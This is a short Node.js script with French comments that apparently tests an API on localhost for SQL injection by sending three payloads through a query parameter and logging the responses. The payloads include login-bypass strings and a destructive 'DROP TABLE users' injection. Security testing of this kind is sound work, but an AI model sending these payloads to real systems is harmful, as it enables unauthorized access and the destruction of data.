const axios = require("axios");

async function testSQLInjection() {
  const url = "http://localhost:5000/api/users"; // Remplace par l'URL de l'API à tester
  const payloads = [
    "' OR '1'='1'; --", // Exemple d'injection
    "' OR 'a'='a'; --",
    "'; DROP TABLE users; --",
  ];

  for (const payload of payloads) {
    try {
      const response = await axios.get(url, {
        params: { userRoutes: payload }, // Remplace 'param' par le nom du paramètre à tester
      });
      console.log(`Réponse pour payload "${payload}":`, response.data);
    } catch (error) {
      console.error(`Erreur pour payload "${payload}":`, error.message);
    }
  }
}

testSQLInjection();
